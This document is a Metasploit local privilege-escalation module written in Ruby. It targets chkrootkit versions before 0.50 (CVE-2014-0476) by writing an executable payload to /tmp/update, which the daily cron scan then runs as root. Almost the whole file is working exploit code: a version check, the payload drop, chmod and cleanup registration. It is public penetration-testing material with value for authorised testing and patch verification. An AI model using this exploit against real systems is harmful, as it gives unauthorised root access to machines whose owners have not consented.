# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class Metasploit4 < Msf::Exploit::Local
 
  # This could also be Excellent, but since it requires
  # up to one day to pop a shell, let&#039;s set it to Manual instead.
  Rank = ManualRanking
 
  include Msf::Post::File
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Chkrootkit Local Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        Chkrootkit before 0.50 will run any executable file named
        /tmp/update as root, allowing a trivial privsec.
 
        WfsDelay is set to 24h, since this is how often a chkrootkit
        scan is scheduled by default.
      },
      &#039;Author&#039;         => [
        &#039;Thomas Stangner&#039;,        # Original exploit
        &#039;Julien "jvoisin" Voisin&#039; # Metasploit module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2014-0476&#039;],
        [&#039;OSVDB&#039;, &#039;107710&#039;],
        [&#039;EDB&#039;, &#039;33899&#039;],
        [&#039;BID&#039;, &#039;67813&#039;],
        [&#039;CWE&#039;, &#039;20&#039;],
        [&#039;URL&#039;, &#039;http://seclists.org/oss-sec/2014/q2/430&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Jun 04 2014&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => true,
      &#039;Stance&#039;         => Msf::Exploit::Stance::Passive,
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => {&#039;WfsDelay&#039; => 60 * 60 * 24} # 24h
    ))
 
    register_options([
      OptString.new(&#039;CHKROOTKIT&#039;, [true, &#039;Path to chkrootkit&#039;, &#039;/usr/sbin/chkrootkit&#039;])
    ])
  end
 
  def check
    version = cmd_exec("#{datastore[&#039;CHKROOTKIT&#039;]} -V 2>&1")
 
    if version =~ /chkrootkit version 0\.[1-4]/
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end
 
  def exploit
    print_warning(&#039;Rooting depends on the crontab (this could take a while)&#039;)
 
    write_file(&#039;/tmp/update&#039;, "#!/bin/sh\n(#{payload.encoded}) &\n")
    cmd_exec(&#039;chmod +x /tmp/update&#039;)
    register_file_for_cleanup(&#039;/tmp/update&#039;)
 
    print_status(&#039;Payload written to /tmp/update&#039;)
    print_status(&#039;Waiting for chkrootkit to run via cron...&#039;)
  end
 
end

